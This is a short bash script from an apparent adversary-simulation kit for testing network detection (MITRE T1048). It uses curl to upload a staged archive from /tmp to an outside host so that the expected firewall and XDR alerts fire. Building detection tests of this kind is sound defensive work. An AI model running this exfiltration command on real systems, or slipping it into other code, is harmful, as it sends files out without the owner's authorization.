#!/usr/bin/env bash
# T1048 — Alternative exfil: HTTPS POST to known-bad endpoint
# Derived verbatim from SIM-MP-003 step step-04 (../../mp-003-data-staged-exfil-dns-tunnel.yml).
# LEGAL: run only in an authorized, isolated lab. See ../README.md.
set -u -o pipefail
echo "[SIM-MP-003/T1048] Alternative exfil: HTTPS POST to known-bad endpoint"

echo '[MP-003] NDR: second exfil channel for redundant detection';
curl -sSL -m 15 -X POST -F "data=@/tmp/cortexsim_stage/bundle.tar.gz" \
  "http://testmynids.org/uid/index.html" 2>/dev/null | head -5 || true;
echo '[*] NGFW flags POST to known-IOC domain; XDR flags file upload from service account'
